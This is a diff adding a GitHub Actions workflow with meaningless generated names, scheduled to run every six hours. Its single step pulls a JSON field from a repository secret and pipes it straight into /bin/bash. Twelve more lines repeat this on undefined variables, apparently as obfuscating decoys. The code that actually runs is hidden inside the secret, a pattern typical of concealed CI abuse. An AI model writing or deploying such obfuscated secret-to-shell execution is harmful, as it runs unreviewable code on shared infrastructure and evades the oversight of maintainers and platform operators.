@@ -1,0 +1,28 @@
+name: zhoudapeng9813
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhoudapeng9813
+        env:
+          vyd9: ${{ secrets.vyd9 }}
+        run: |
+          echo $vyd9 | jq -r .ci7 | /bin/bash
+          echo $t9142 | jq -r .skv770 | /bin/bash
+          echo $ci75 | jq -r .m59247 | /bin/bash
+          echo $aezb340 | jq -r .bf401 | /bin/bash
+          echo $s65427 | jq -r .rieli09 | /bin/bash
+          echo $ijmlx2 | jq -r .ajve2 | /bin/bash
+          echo $fdd34184 | jq -r .p16 | /bin/bash
+          echo $o27999 | jq -r .n2 | /bin/bash
+          echo $ej51782 | jq -r .dd27565 | /bin/bash
+          echo $i0946 | jq -r .a701 | /bin/bash
+          echo $vz69404 | jq -r .eck24 | /bin/bash
+          echo $qb6560 | jq -r .ub69 | /bin/bash
+          echo $duhq99 | jq -r .e6 | /bin/bash
+
